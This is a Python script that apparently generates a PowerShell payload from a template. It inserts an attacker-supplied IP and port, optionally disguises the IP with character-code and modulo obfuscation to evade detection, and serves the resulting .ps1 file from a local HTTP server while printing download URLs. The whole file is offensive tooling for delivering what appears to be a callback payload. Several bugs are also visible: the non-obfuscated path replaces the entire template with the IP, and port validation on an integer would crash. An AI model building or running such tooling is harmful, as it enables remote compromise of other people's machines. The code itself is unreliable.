import random,os,socket,http.server,re,sys

class Generate:
    def __init__(self,ip_address,port,filename,enable_obfuscation,host_after_generating,hosting_port):
        self.ip_addres = ip_address
        self.port = port
        self.filename = filename
        self.enable_obfuscation = enable_obfuscation
        self.host_after_generating = host_after_generating
        self.hosting_port = hosting_port

    #obfuscate ip
    def obfuscate_string(self):
        input_str = self.ip_addres

        if not input_str:
            return "", 0
            
        # Find the last block (e.g., the '125' in '192.168.29.125')
        # If there's a dot, we split on the last dot to isolate the number for math obfuscation
        if '.' in input_str:
            base_part, math_part = input_str.rsplit('.', 1)
            base_part += '.'  # Re-add the trailing dot to the string portion
        else:
            # Fallback if it's not an IP: split at the last character
            base_part, math_part = input_str[:-1], input_str[-1:]

        # 1. Obfuscate the base string into $[char]0xXX format
        char_blocks = []
        for char in base_part:
            hex_val = hex(ord(char)).upper().replace("0X", "0x")
            char_blocks.append(f"$([char]{hex_val})")
        
        char_string = "".join(char_blocks)

        # 2. Obfuscate the last part using modulo arithmetic if it's a number
        if math_part.isdigit():
            target_num = int(math_part)
            # Generate a random divisor greater than the target number
            divisor = random.randint(target_num + 1, target_num + 200)
            # Calculate a multiple that, when added to the target, creates our large number
            multiplier = random.randint(3, 10)
            large_num = (divisor * multiplier) + target_num
            
            math_string = f"$({large_num} % {divisor})"
        else:
            # Fallback if the trailing character isn't a number
            hex_val = hex(ord(math_part)).upper().replace("0X", "0x")
            math_string = f"$([char]{hex_val})"

        # Combine them into the final PowerShell string concatenation
        powershell_line = f'("{char_string}" + {math_string})'
        return powershell_line
    
    #host file
    def host_file(self):
        #list IP as URL for downloading ps1 file
        try:
            hostname = socket.gethostname()
            ip_list = socket.gethostbyname_ex(hostname)[2]
            print("\nAvailable Network URLs : \n------------------------")
            for ip in ip_list:
                print(f"[+] http://{ip}:{self.hosting_port}/{self.filename}.ps1")
            print(f'\n')
        except Exception:
            print("[X] Failed to list IPs.")

        #spawn the http server
        try:
            handler = http.server.SimpleHTTPRequestHandler
            server_address = ('0.0.0.0', self.hosting_port)
            httpd = http.server.ThreadingHTTPServer(server_address, handler)
            print(f"[+] Server successfully running on port {self.hosting_port}...")
            print("[!] Press CTRL+C to stop hosting.")
            httpd.serve_forever()

        except KeyboardInterrupt:
            print("\n[-] Server stopped cleanly by user.")
            httpd.server_close()

        except Exception as e:
            print(f"[X] Server failed to start: {e}")

    #replace values and create ps1 file
    def replace_and_create(self):
        script_dir = os.path.dirname(os.path.abspath(__file__))
        model_filename = "obf_backup.txt" if self.enable_obfuscation == True else "non_obfuiscated.txt"
        model_file_path  = os.path.join(script_dir, "res", model_filename)

        try:
             with open(model_file_path, "r", encoding="utf-8") as file: 
                 #entire content
                 file_content = file.read()

                 #replace values (ip)
                 file_content = file_content.replace("IP_ADD",self.obfuscate_string()) if self.enable_obfuscation == True else self.ip_addres
                 file_content = file_content.replace("PORT",self.port)
                 
                 #generate new ps1 file
                 new_ps1file_path  = os.path.join(script_dir, f"{self.filename}.ps1")
                 try:
                     with open(new_ps1file_path, "w",encoding="utf-8") as newps1file:
                        newps1file.write(file_content)
                        print(f"[+] Created file {self.filename}.ps1, Location : {new_ps1file_path}")
                 except Exception as e:
                     print(f"[X] Error writing new file: {e}")

        except FileNotFoundError:
            print("[X] Error Occured : 'myfile.txt' was not found inside the directory 'res'")
        except Exception as e:
            print(f"[X] Error reading file: {e}")

        if self.host_after_generating == True:
            self.host_file()


        

server_ip = input("Enter Server IP : ")

#validate ip address
ip_pattern = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
if not re.match(ip_pattern,server_ip):
    print("[X] Invalid Ip address.")
    sys.exit(0)


server_port = input("Enter Port Number : ")

#validate port
port_pattern = r"^(?:[1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$"
if not re.match(port_pattern,server_port):
    print("[X] Invalid Ip address.")
    sys.exit(0)

filename = input("Name For The Generated File : ")
obfuscate_script = input("Enable Obfuscation [y/n] : ")
host_after_generating = input("Host After Generating [y/n] : ")
enable_obfuscation = True if obfuscate_script=="y" else False
enable_host = True if host_after_generating=="y" else False
port_to_host = 0

if enable_host == True:
    port_to_host = int(input("Enter Port To Host : "))
    if not re.match(port_pattern,port_to_host):
        print("[X] Invalid Port! Defaulting to 8000")
        port_to_host = 8000



app = Generate(server_ip,server_port,filename,enable_obfuscation,enable_host,port_to_host)
app.replace_and_create()


# app = Generate("127.0.0.1","80","kkk",True,True,8070)
# app.replace_and_create()


